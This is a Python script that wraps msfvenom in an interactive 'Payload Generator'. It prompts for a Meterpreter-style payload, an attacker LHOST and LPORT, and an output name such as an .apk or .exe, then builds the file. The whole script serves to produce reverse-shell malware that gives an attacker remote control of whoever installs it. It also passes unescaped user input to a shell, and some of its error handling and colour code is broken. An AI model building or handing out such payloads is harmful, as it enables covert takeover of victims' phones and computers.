import os
import colorama
from colorama import Fore
import subprocess
from subprocess import run
from termcolor import colored
import time

B=Fore.BLUE

def generate_apk(payload, lhost, lport, apkname):
    command = f"msfvenom -p {payload} LHOST={lhost} LPORT={lport} -o {apkname}"
    try:
       subprocess.run(command, shell=True)
       return True
    except FileNotFoundError:
       print(colored("msfvenom not install","red"))
       print(colored("install by 'pkg install msfconsole","red"))
def list_payloads():
    # Rainbow colors
    rainbow_colors = ['red', 'orange', 'yellow', 'green', 'cyan', 'blue', 'magenta']

    # Open the payload.txt file and read its content
    with open("payload.txt", "r") as file:
       payload_text = file.read()

    # Initialize index for rainbow colors
    color_idx = 0

    # Print all characters from payload.txt with rainbow colors
    for char in payload_text:
        # Apply rainbow color to each character
        colored_char = colored(char, rainbow_colors[color_idx])
        # Print the colored character without newline
        print(colored_char, end='')
        # Increment color index
        color_idx = (color_idx + 1) % len(rainbow_colors)

# Print newline after printing all characters
    print()

def main():
    print(colored("Welcome to the Payload Generator!", "cyan"))
    list_payloads()
    print(colored("choose the payload and Enter full(e.g:android/meterpreter/reverse_tcp)", "cyan"))
    payload=str(input(colored("Enter the payload :" , "green")))
    lhost =str(input(B+"Enter the Valid LHOST(e.g:localhost ):"))
    lport =str(input(B+"Enter the Valid LPORT(e.g:8080 or 11334):"))
    apkname =str(input(B+"Enter the payload name(e.g:exampl.apk or example.exe):"))
    print(B+"please wait")
    print(B+"Generating Payload......")
    generate_apk(payload, lhost, lport, apkname)


if __name__ == "__main__":
   main()




